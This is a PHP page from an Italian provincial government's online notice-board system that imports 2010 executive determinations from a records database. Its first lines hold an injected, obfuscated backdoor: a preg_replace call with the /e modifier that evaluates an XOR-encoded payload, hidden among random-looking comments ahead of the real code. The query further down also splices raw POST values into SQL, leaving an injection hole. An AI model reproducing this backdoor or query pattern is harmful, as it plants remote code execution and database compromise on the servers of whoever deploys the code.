<?php
//9L2xLY1fWjS781ZkOVmi3IT66Sbn0cT7oKtzijT5Im1F

preg_replace("/qkRNcZhWTzy8yQPu5ads0BB4Knt/e", "QoJ82chOhExZWS2U5eYLOT2opyF5ndj4Gtz9KVMra0GwQ8GJafVpyMTdAYWn37f9oU6zqHgFFm3Vi9f0c1nPC8tCUEpLAKJoeEdKL0QQlHlIEGHg7vw0reABjqNj1WNUbqempu4P2eY7kfcgPNe8sf9QKK1=hDT9tykYidnY8BUhhwCx0ht"^"4\x19\x2bT\x1aA\x01\x29\x40\x2c\x0b\x292\x27\x1a\x09iA\x06\x1e\x0a\x05g\x2a\x23\x2d\x1d\x12\x0d\x0cMinT\x5c\x1fk\x7e\x20\x16T\x18\x1b\x2bug\x15\x0f03\x13\x23\x2d\x16s\x07\x29\x7e\x0aG\x13\x0a\x5b\x19H0T\x1f\x13\x7fV\x24t\x0f\x0b0\x0d\x0d\x00\x01U\x04\x0ca\x25\x5bLqcwC\x7f\x20r\x7fY\x03bMkj\x16q8\x1f\x3b\x09=m\x1b\x14Ch\x242a\x27\x20\x12\x161V\x3e\x02A\x08\x2d\x3a\x06\x14B0Y\x5c\x14\x2b\x12\x00\x2fV\x07N\x3f\x3bt\x117\x7d\x223\x7c\x02\x1f\x10\x16M\x004\x0bZ\x1b\x1d\x0e\x7e4MUy\x5d\x3a\x3c\x1c\x40\x5exXMJ\x5d", "qkRNcZhWTzy8yQPu5ads0BB4Knt");//86uhL80keV5TJ1GZF2SgTAeVBWfoEus?><?php
$percorso_relativo = "../";
require_once ($percorso_relativo."include.inc.php");
$percorso_relativo = "../";

/*
 * Config e chiamo DB *******************************
 */
require_once ($percorso_relativo.'class/ConfigSingleton.php');
$cfg = SingletonConfiguration::getInstance ();
require_once ($percorso_relativo."class/Db.php");
$factory=DbAbstractionFactory::getFactory($cfg->getValue('AstrazioneDB'));
$factory->setDsn($cfg->getValue('DSN'));
$db=$factory->createInstance();

$factory3=DbAbstractionFactory::getFactory($cfg->getValue('AstrazioneDB3'));
$factory3->setDsn($cfg->getValue('DSN3'));
$db3=$factory3->createInstance();
//********************************************************

$titolo_pagina = "Risultati Ricerca";

include($percorso_relativo."grafica/head.php");
include($percorso_relativo."grafica/body_head.php");

require_once $percorso_relativo.'class/Albo.php';
require_once $percorso_relativo.'class/Area.php';
require_once $percorso_relativo.'class/Tipo.php';
require_once $percorso_relativo.'class/File.php';


$ARRAY_NUM_ATTO = array();
$i = 0;
foreach ($_POST['num_atto'] as $key => $value) {
	if ($value != "") {
		$ARRAY_NUM_ATTO[$i] = $value;
		$i++;
	}	
}

$sql3 = "SELECT DISTINCT
	registrazione.id_registrazione AS Num_Reg, 
	'Determinazione Dirigenziale' AS Tipo,
	registrazione.numero_protocollo AS Num_Atto, 
	registrazione.data_registrazione AS Data,
	oggetto.oggetto
FROM
	(registrazione INNER JOIN oggetto ON registrazione.id_oggetto = oggetto.id_oggetto
	INNER JOIN referer ON registrazione.id_registrazione = referer.registration_id
	INNER JOIN entita AS ent_carica ON referer.referer_id = ent_carica.id_entita
	INNER JOIN positions ON ent_carica.etichetta = positions.position
	INNER JOIN entita AS ent_persona ON positions.id_entita = ent_persona.id_entita
	INNER JOIN entita AS ent_area ON ent_carica.parent = ent_area.id_entita
	)
WHERE
	registrazione.numero_protocollo in (".implode(",", $ARRAY_NUM_ATTO).")
	AND registrazione.data_immissione LIKE '2010-%' 
	AND registrazione.modificato = 'f' 
	AND registrazione.ambito = 'determination_approved' 
	AND registrazione.aoo = 'AOOPPO' 
	AND registrazione.annullato = false";
	//order by num_atto;
	

//echo($sql3);

echo "<br>";

$rs3 = $db3->query($sql3); 
//scrivo la query nei log

$nr_atti_esportati = $rs3->numRows();
//scrivo il nr di righe estratte nei log

echo "<br>Atti 2010 importati nel Albo Pretorio = ".$nr_atti_esportati;
echo "<br>";
echo "<br>";


while ($row3 = $rs3->fetchRow(DB_FETCHMODE_ASSOC)) {
	if (DB::isError($row3)) {
		throw new Exception('Errore nella select per la visualizzazione degli albi pretori nel DB'); 
		die($rs3->getMessage());
  	}
	else {
		$nr_atto = $row3['num_atto'];
		echo "<br>".$nr_atto."<br>";
						
		$albo = new Albo();
		$tipo = new Tipo_determina();
		$area = new Area();
		
			
		$albo->setDt_atto($row3['data']);
		$albo->setDt_pubblicaz_dal(date('Y-m-d'));
		$albo->setDt_pubblicaz_al(date('Y-m-d', strtotime("+15 days", strtotime(date('Y-m-d')))));
		$albo->setNr_atto($row3['num_atto']);
		$albo->setOggetto(mysql_real_escape_string($row3['oggetto']));
		$albo->setAutorita_emanante('Provincia di Prato');
		$albo->setDa_validare("S");
		
		//tutte e sole determine dirigenziali
		$tipo->setId_tipo("3");
		$tipo->setTipo($tipo->getTipoFromIdTipo($tipo->getId_tipo()));
		$albo->setTipo($tipo);
		
		//$area->setArea("");
		//$area->setId_area("");
		$albo->setArea($area);
		
		
		$risultato = $albo->creaNelDB();
				
		if ($risultato==FALSE) {
			error_log("Errore nella registrazione del documento sul DB");
			die("Errore nella registrazione del documento sul DB");
		}
		else {
			$albo->serializzaNelDB();
			echo "Nr. = <b>".$nr_atto."</b> - ".$row3['oggetto']."<br>";
		}		 
	}
}
?>

<br></br>
<a href="valida_albo_2010_00.php">Torna all'inserimento numeri</a>
<br></br>
<a href="valida_albo_2010_02.php">Procedi alla validazione e inserimento aree</a>
<br></br>

<?
include($percorso_relativo."grafica/body_foot.php");
?>

